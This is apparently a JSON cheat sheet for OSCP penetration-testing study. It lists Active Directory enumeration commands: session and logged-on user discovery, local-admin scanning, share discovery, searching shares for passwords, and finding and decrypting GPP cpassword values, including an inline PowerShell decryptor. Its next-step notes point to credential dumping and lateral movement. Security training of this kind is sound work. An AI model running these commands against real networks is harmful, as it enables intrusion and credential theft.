{
  "category": "enumeration",
  "description": "Session enumeration, share discovery, and lateral movement preparation",
  "commands": [
    {
      "id": "powerview-get-netsession",
      "name": "Enumerate Active Sessions (PowerView)",
      "category": "enumeration",
      "command": "Get-NetSession -ComputerName <TARGET>",
      "description": "List active user sessions on a remote computer using NetSessionEnum API",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "POWERVIEW",
        "SESSIONS",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP to query sessions on",
          "example": "DC1.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ComputerName": "Specifies the target computer to query sessions on. Uses NetSessionEnum API which requires specific registry permissions on target."
      },
      "success_indicators": [
        "CName",
        "UserName",
        "Time",
        "Session information displayed"
      ],
      "failure_indicators": [
        "Access is denied",
        "RPC server unavailable",
        "No sessions found"
      ],
      "next_steps": [
        "Identify high-value logged-on users (Domain Admins)",
        "Target computers where admins are logged in for credential theft",
        "Use Get-NetLoggedon for alternative enumeration method"
      ],
      "alternatives": [
        "get-netloggedon",
        "psloggedon"
      ],
      "prerequisites": [
        "import-powerview"
      ],
      "troubleshooting": {
        "Access is denied": "NetSessionEnum requires SrvsvcSessionInfo registry read access. This is blocked on Windows 11/Server 2022+ by default. Use Get-NetLoggedon or PsLoggedOn instead.",
        "RPC server unavailable": "Target firewall blocking RPC. Verify connectivity: Test-Connection -ComputerName <TARGET>",
        "No sessions found": "No active sessions OR permissions issue. Try PsLoggedOn if you have admin access."
      },
      "notes": "NetSessionEnum API queries SrvsvcSessionInfo registry key on target. Windows 11/Server 2022+ restrict access by default (only SYSTEM/Administrators can read). Returns sessions created via SMB/file shares. CName = source computer establishing the session, UserName = user account. If you see admin sessions, target that source computer for credential theft (mimikatz, lsass dump). OSCP: Works on legacy systems (Windows 7, Server 2008-2016) but often fails on modern Windows. Have alternatives ready.",
      "oscp_relevance": "high"
    },
    {
      "id": "powerview-get-netloggedon",
      "name": "Get Logged On Users (PowerView)",
      "category": "enumeration",
      "command": "Get-NetLoggedon -ComputerName <TARGET>",
      "description": "Enumerate users currently logged on to a remote computer (requires local admin or Remote Registry service)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "POWERVIEW",
        "SESSIONS",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "WEB04.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ComputerName": "Target computer to query. Uses Remote Registry service to enumerate logged-on users from registry hives."
      },
      "success_indicators": [
        "UserName",
        "LogonDomain",
        "Logged-on users displayed"
      ],
      "failure_indicators": [
        "Access Denied",
        "RPC server unavailable",
        "Remote Registry service not running"
      ],
      "next_steps": [
        "Identify domain admin sessions",
        "Target systems where privileged users are logged in",
        "Attempt credential theft if admin access available"
      ],
      "alternatives": [
        "psloggedon",
        "get-netsession"
      ],
      "prerequisites": [
        "import-powerview"
      ],
      "troubleshooting": {
        "Access Denied": "Requires local admin on target OR Remote Registry service enabled. Check permissions: Test-AdminAccess -ComputerName <TARGET>",
        "Remote Registry service not running": "Service disabled. Use Find-LocalAdminAccess to find systems where you have admin rights.",
        "RPC server unavailable": "Target firewall blocking RPC or system offline"
      },
      "notes": "Uses Remote Registry service to query HKEY_USERS hive and enumerate loaded user profiles (= logged-on users). Remote Registry is disabled by default on Windows 8+ workstations but enabled on servers (2012+). Requires local admin OR Remote Registry service explicitly enabled. More reliable than Get-NetSession on modern Windows. Returns interactive logons (RDP, console) and service logons. OSCP: If you have local admin, this works. If not, it likely fails.",
      "oscp_relevance": "high"
    },
    {
      "id": "powerview-find-localadminaccess",
      "name": "Find Local Admin Access (PowerView)",
      "category": "enumeration",
      "command": "Find-LocalAdminAccess",
      "description": "Scan the domain to identify computers where current user has local administrator privileges",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "POWERVIEW",
        "LATERAL_MOVEMENT",
        "PRIVESC",
        "OSCP:HIGH"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Computer names where you have admin access",
        "List of accessible systems"
      ],
      "failure_indicators": [
        "No systems found",
        "Module not imported",
        "Timeout errors"
      ],
      "next_steps": [
        "Access identified systems: Enter-PSSession -ComputerName <FOUND_COMPUTER>",
        "Enumerate logged-on users: Get-NetLoggedon -ComputerName <FOUND_COMPUTER>",
        "Search for credentials: Invoke-Mimikatz, lsass dumps"
      ],
      "alternatives": [],
      "prerequisites": [
        "import-powerview"
      ],
      "troubleshooting": {
        "Module not imported": "Import-Module .\\PowerView.ps1",
        "Long execution time": "Scans entire domain. Limit scope with -ComputerName parameter for specific targets.",
        "No systems found": "Your user has no local admin rights. Check group memberships: Get-NetUser -Identity <YOU> | select memberof"
      },
      "notes": "Connects to each domain computer's Service Control Manager (OpenServiceW function) with SC_MANAGER_ALL_ACCESS rights. If connection succeeds, you have local admin. Scans entire domain (slow in large environments - may take 5-15 minutes). Results reveal lateral movement opportunities: computers where you can execute code as admin, dump credentials, install backdoors. OSCP: Run this early to map attack surface. Any system with admin access is a potential pivot point for credential theft.",
      "oscp_relevance": "high"
    },
    {
      "id": "powerview-find-domainshare",
      "name": "Find Domain Shares (PowerView)",
      "category": "enumeration",
      "command": "Find-DomainShare",
      "description": "Discover all file shares in the domain to identify accessible data and potential credential storage",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "POWERVIEW",
        "SHARES",
        "OSCP:HIGH"
      ],
      "variables": [],
      "flag_explanations": {
        "-CheckShareAccess (optional)": "Only return shares you can access. Use: Find-DomainShare -CheckShareAccess",
        "-ExcludeStandard (optional)": "Exclude standard shares (ADMIN$, C$, IPC$). Use: Find-DomainShare -ExcludeStandard",
        "-ExcludeIPC (optional)": "Exclude IPC$ shares. Use: Find-DomainShare -ExcludeIPC"
      },
      "success_indicators": [
        "Name",
        "Type",
        "Remark",
        "ComputerName",
        "Share names listed"
      ],
      "failure_indicators": [
        "Module not imported",
        "No shares found",
        "Access Denied"
      ],
      "next_steps": [
        "Check accessible shares: Find-DomainShare -CheckShareAccess",
        "Search for sensitive files: Invoke-ShareFinder -ShareList <LIST> -Terms passwords,config,backup",
        "Check SYSVOL for GPP passwords: ls \\\\<DC>\\SYSVOL\\<DOMAIN>\\Policies\\ -Recurse"
      ],
      "alternatives": [],
      "prerequisites": [
        "import-powerview"
      ],
      "troubleshooting": {
        "Module not imported": "Import-Module .\\PowerView.ps1",
        "Too many results": "Filter with -ExcludeStandard -ExcludeIPC to remove default shares",
        "Long execution time": "Scans entire domain. Specify -ComputerName for specific targets."
      },
      "notes": "Returns all shares from all domain computers: default shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) and custom shares (data, backups, users). Custom shares often contain sensitive data: credentials in scripts, configuration files, password databases, backup files. SYSVOL share always accessible (domain-wide readable) - search for GPP passwords (cpassword attribute in Groups.xml, ScheduledTasks.xml). OSCP: Always enumerate shares - common source of credentials and sensitive information.",
      "oscp_relevance": "high"
    },
    {
      "id": "powerview-find-domainshare-accessible",
      "name": "Find Accessible Domain Shares (PowerView)",
      "category": "enumeration",
      "command": "Find-DomainShare -CheckShareAccess",
      "description": "List only file shares you can actually access (tests read permissions)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "POWERVIEW",
        "SHARES",
        "OSCP:HIGH"
      ],
      "variables": [],
      "flag_explanations": {
        "-CheckShareAccess": "Tests read access to each discovered share. Only returns shares you can access."
      },
      "success_indicators": [
        "Name",
        "ComputerName",
        "Accessible shares listed"
      ],
      "failure_indicators": [
        "No accessible shares",
        "Module not imported"
      ],
      "next_steps": [
        "Manually browse accessible shares: ls \\\\<COMPUTER>\\<SHARE>",
        "Search for sensitive files: findstr /S /I password *.txt *.xml *.config",
        "Check for writable shares: test write access with New-Item"
      ],
      "alternatives": [],
      "prerequisites": [
        "import-powerview"
      ],
      "troubleshooting": {
        "Module not imported": "Import-Module .\\PowerView.ps1",
        "Long execution time": "Tests access to every share in domain. Be patient or limit scope with -ComputerName.",
        "No accessible shares": "Your user has minimal permissions. Check group memberships for share access."
      },
      "notes": "Automatically tests read access to every discovered share. Much faster than manually testing each share. Results are immediately actionable - you can access these shares. Focus on non-standard shares (not ADMIN$, C$, IPC$). Common findings: user home directories, department shares (HR, Finance, IT), backup shares, application config shares. OSCP: Use this to quickly identify where you can read sensitive data. Look for config files, scripts, and credentials.",
      "oscp_relevance": "high"
    },
    {
      "id": "sysinternals-psloggedon",
      "name": "PsLoggedOn (Sysinternals)",
      "category": "enumeration",
      "command": ".\\PsLoggedon.exe \\\\<TARGET>",
      "description": "Sysinternals tool to enumerate logged-on users via Remote Registry (more reliable than PowerView on modern Windows)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SYSINTERNALS",
        "SESSIONS",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "FILES04.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Users logged on locally",
        "Users logged on via resource shares",
        "Usernames displayed"
      ],
      "failure_indicators": [
        "Unable to query",
        "Access Denied",
        "No one is logged on"
      ],
      "next_steps": [
        "Target systems where admin users are logged in",
        "Attempt credential theft if you have admin access",
        "Check other systems: loop through computer list"
      ],
      "alternatives": [
        "powerview-get-netloggedon"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access Denied": "Remote Registry service disabled or insufficient permissions. Need local admin OR service enabled.",
        "Unable to query resource logons": "NetSessionEnum API blocked (normal on Windows 11/Server 2022+). Local logon enumeration still works.",
        "Tool not found": "Download Sysinternals Suite: https://live.sysinternals.com/PsLoggedon.exe"
      },
      "notes": "More reliable than PowerView's Get-NetLoggedon/Get-NetSession on modern Windows. Uses two methods: (1) Remote Registry (queries HKEY_USERS for loaded profiles), (2) NetSessionEnum (lists resource share sessions). Remote Registry auto-starts when you connect if service is set to 'Manual' (default on servers). Returns both interactive logons (RDP, console) and resource share logons (file shares). OSCP: Keep this in your toolkit - works when PowerView fails. Especially useful on Windows Server targets.",
      "oscp_relevance": "high"
    },
    {
      "id": "net-view-shares",
      "name": "List Shares with net view",
      "category": "enumeration",
      "command": "net view \\\\<TARGET>",
      "description": "Built-in Windows command to list all shares on a remote computer",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SHARES",
        "LEGACY",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "FILES04.corp.com",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Share name",
        "Type",
        "Used as",
        "Comment",
        "Shares listed"
      ],
      "failure_indicators": [
        "Access is denied",
        "Network path was not found",
        "System error 5"
      ],
      "next_steps": [
        "Test access: dir \\\\<TARGET>\\<SHARE>",
        "Search for sensitive files",
        "Mount share: net use Z: \\\\<TARGET>\\<SHARE>"
      ],
      "alternatives": [
        "powerview-find-domainshare"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access is denied": "No permissions to list shares. Try different target or authenticate: net use \\\\<TARGET> /user:<DOMAIN>\\<USERNAME>",
        "Network path was not found": "Target unreachable or SMB disabled. Check connectivity: ping <TARGET>"
      },
      "notes": "Built-in Windows tool, available on all systems. Lists both default shares (ADMIN$, C$, IPC$) and custom shares. Does not test access - just lists share names. Faster than PowerView for single-target enumeration. Type field shows Disk (file share), Print (printer share), IPC (inter-process communication). OSCP: Use this for quick manual share enumeration when PowerView is unavailable or restricted.",
      "oscp_relevance": "high"
    },
    {
      "id": "test-share-access",
      "name": "Test Share Access",
      "category": "enumeration",
      "command": "dir \\\\<TARGET>\\<SHARE>",
      "description": "Test read access to a network share using built-in Windows dir command",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SHARES",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "FILES04.corp.com",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "Share name to test",
          "example": "backup",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Directory listing",
        "Files displayed",
        "Access successful"
      ],
      "failure_indicators": [
        "Access is denied",
        "Logon failure",
        "Network path was not found"
      ],
      "next_steps": [
        "Recursively search for files: dir \\\\<TARGET>\\<SHARE> /s /b",
        "Search for sensitive patterns: findstr /S /I password *.txt *.config *.xml",
        "Download interesting files: copy \\\\<TARGET>\\<SHARE>\\<FILE> ."
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Access is denied": "No read permissions. Try other shares or authenticate with different credentials.",
        "Logon failure": "Invalid credentials. Re-authenticate: net use \\\\<TARGET>\\<SHARE> /user:<DOMAIN>\\<USERNAME>"
      },
      "notes": "Simple test for share accessibility. If dir succeeds, you have at least read access. Recurse with /s to list all subdirectories and files. Pipe to findstr to search for interesting files: dir /s /b | findstr /I password config backup. Check file timestamps to identify recently modified files (may contain current credentials). OSCP: Always test SYSVOL share first - domain-wide readable, often contains GPP passwords in Policies folder.",
      "oscp_relevance": "high"
    },
    {
      "id": "search-share-files",
      "name": "Search Share for Sensitive Files",
      "category": "enumeration",
      "command": "findstr /S /I /M /P \"<PATTERN>\" \\\\<TARGET>\\<SHARE>\\*.*",
      "description": "Recursively search files in a network share for sensitive patterns (passwords, credentials, config)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SHARES",
        "CREDENTIALS",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<PATTERN>",
          "description": "Search pattern (password, config, backup, etc.)",
          "example": "password",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "FILES04",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "Share name",
          "example": "backup",
          "required": true
        }
      ],
      "flag_explanations": {
        "/S": "Search subdirectories recursively.",
        "/I": "Case-insensitive search.",
        "/M": "Print only filenames that contain matches (not matched lines - useful for finding files).",
        "/P": "Skip files with non-printable characters (binary files)."
      },
      "success_indicators": [
        "Filenames with matches",
        "Files containing pattern"
      ],
      "failure_indicators": [
        "No files found",
        "Access is denied",
        "File not found"
      ],
      "next_steps": [
        "Review found files: type \\\\<TARGET>\\<SHARE>\\<FOUND_FILE>",
        "Download for offline analysis: copy \\\\<TARGET>\\<SHARE>\\<FOUND_FILE> .",
        "Search for multiple patterns: findstr /S /I /M \"password config backup credential\" *.*"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Access is denied": "No read permissions on some files. Results may be incomplete.",
        "Long execution time": "Large share or slow network. Limit scope to specific file types: findstr /S /I \"password\" *.txt *.xml *.config",
        "Too many false positives": "Refine pattern: findstr /S /I \"password =\" *.config"
      },
      "notes": "Common search patterns: password, pwd, pass, credential, key, secret, token, api_key, backup, config, admin. Interesting file extensions: .txt, .xml, .config, .ini, .bat, .ps1, .sql, .bak, .old. Check SYSVOL\\Policies for GPP passwords in Groups.xml and ScheduledTasks.xml. Search for cpassword attribute. OSCP: This is how you find credentials in shares - systematic search beats manual browsing.",
      "oscp_relevance": "high"
    },
    {
      "id": "gpp-password-decrypt",
      "name": "Decrypt GPP Password",
      "category": "enumeration",
      "command": "gpp-decrypt \"<CPASSWORD>\"",
      "description": "Decrypt AES-encrypted Group Policy Preference passwords found in SYSVOL using published Microsoft AES key",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "GPP",
        "CREDENTIALS",
        "PASSWORDS",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<CPASSWORD>",
          "description": "Encrypted cpassword value from Groups.xml or ScheduledTasks.xml",
          "example": "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Plaintext password displayed"
      ],
      "failure_indicators": [
        "Invalid cpassword",
        "gpp-decrypt: command not found"
      ],
      "next_steps": [
        "Test credentials: crackmapexec smb <TARGET> -u <USER> -p <DECRYPTED_PASSWORD>",
        "Try password against local admin accounts",
        "Check password age and reuse across systems"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Command not found": "Not on Kali. Use online decoder or PowerShell: $key = [byte[]](0x4e,0x99,0x06,0xe8,...); [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.AES]::Create().CreateDecryptor($key,$null).TransformFinalBlock([Convert]::FromBase64String('<CPASSWORD>'),0,[Convert]::FromBase64String('<CPASSWORD>').Length))",
        "Invalid cpassword": "Corrupted value. Re-extract from XML: cat \\\\<DC>\\SYSVOL\\<DOMAIN>\\Policies\\<GUID>\\*.xml | findstr cpassword"
      },
      "notes": "GPP (Group Policy Preferences) passwords were stored AES-256 encrypted in SYSVOL. Microsoft published the AES key on MSDN (MS14-025), allowing anyone to decrypt. Common locations: Groups.xml (local admin password), ScheduledTasks.xml (scheduled task credentials), Services.xml (service account passwords). SYSVOL is domain-wide readable - all users can access. Search pattern: findstr /S /I cpassword \\\\<DC>\\SYSVOL\\<DOMAIN>\\Policies\\*.xml. Microsoft patched the ability to SET new GPP passwords (2014) but old passwords remain. OSCP: Still found in legacy labs - always check SYSVOL.",
      "oscp_relevance": "high"
    },
    {
      "id": "powerview-find-domainshare-exclude",
      "name": "Find Domain Shares (Exclude Defaults)",
      "category": "enumeration",
      "command": "Find-DomainShare -CheckShareAccess -ExcludeStandard",
      "description": "Enumerate accessible SMB shares excluding default shares (ADMIN$, C$, IPC$)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SHARES",
        "POWERVIEW",
        "LATERAL_MOVEMENT",
        "OSCP:HIGH"
      ],
      "variables": [],
      "flag_explanations": {
        "-CheckShareAccess": "Only returns shares you can read (tests access before returning)",
        "-ExcludeStandard": "Excludes default Windows shares (ADMIN$, C$, IPC$). Focus on custom shares (Users, IT-Tools, Backups, etc.)."
      },
      "success_indicators": [
        "ComputerName",
        "ShareName",
        "SharePath"
      ],
      "failure_indicators": [
        "Find-DomainShare not recognized",
        "No shares found"
      ],
      "next_steps": [
        "Mount accessible shares: net use Z: \\\\<COMPUTER>\\<SHARE>"
      ],
      "alternatives": [],
      "prerequisites": [
        "import-powerview"
      ],
      "troubleshooting": {
        "No shares found": "Remove -CheckShareAccess to see all shares (including non-accessible)"
      },
      "notes": "Focus on non-standard shares. Common finds: SYSVOL (GPP passwords), NETLOGON (login scripts), Users (SSH keys, .rdp files), IT (tools/scripts).",
      "oscp_relevance": "high"
    },
    {
      "id": "psloggedon",
      "name": "Enumerate Logged-On Users (PsLoggedOn)",
      "category": "enumeration",
      "command": "PsLoggedOn.exe \\\\<COMPUTER>",
      "description": "Display locally and remotely logged-on users using Sysinternals PsLoggedOn",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "SESSIONS",
        "SYSINTERNALS",
        "LATERAL_MOVEMENT",
        "OSCP:MEDIUM"
      ],
      "variables": [
        {
          "name": "<COMPUTER>",
          "description": "Target computer name or IP",
          "example": "WS01",
          "required": true
        }
      ],
      "flag_explanations": {
        "\\\\<COMPUTER>": "Target remote computer. Omit to query local machine."
      },
      "success_indicators": [
        "Users logged on locally",
        "Users logged on via resource shares"
      ],
      "failure_indicators": [
        "Access denied",
        "Network path not found",
        "RPC server unavailable"
      ],
      "next_steps": [
        "If Domain Admin logged on, target that machine for credential dumping"
      ],
      "alternatives": [
        "get-netloggedon"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access denied": "Requires local admin on target. Try alternative: Get-NetLoggedon",
        "RPC server unavailable": "Remote Registry service disabled. Common on modern Windows."
      },
      "notes": "Alternative to Get-NetLoggedon when PowerView not available. Works even when NetSessionEnum API is restricted. Requires Remote Registry service enabled (disabled by default on Server 2019+/Windows 11+).",
      "oscp_relevance": "medium"
    },
    {
      "id": "gpp-password-files",
      "name": "Find GPP Password Files in SYSVOL",
      "category": "enumeration",
      "command": "findstr /S /I cpassword \\\\<DOMAIN>\\sysvol\\<DOMAIN>\\policies\\*.xml",
      "description": "Search SYSVOL for Group Policy Preference files containing encrypted passwords",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "GPP",
        "PASSWORDS",
        "SYSVOL",
        "OSCP:HIGH",
        "QUICK_WIN"
      ],
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "/S": "Recursive search through all subdirectories",
        "/I": "Case-insensitive search",
        "cpassword": "Attribute name for encrypted password in GPP XML files"
      },
      "success_indicators": [
        "cpassword=",
        "Groups.xml",
        "ScheduledTasks.xml"
      ],
      "failure_indicators": [
        "File Not Found",
        "Access denied",
        "No matches"
      ],
      "next_steps": [
        "Decrypt found passwords: gpp-decrypt <CPASSWORD>"
      ],
      "alternatives": [
        "get-gpppassword"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "No matches": "No GPP passwords in SYSVOL. Try other credential sources (KeePass, web.config, etc.)"
      },
      "notes": "CRITICAL OSCP technique. Common files: Groups.xml (local admin password), ScheduledTasks.xml (task credentials), Services.xml (service accounts). All authenticated users can read SYSVOL.",
      "oscp_relevance": "high"
    }
  ]
}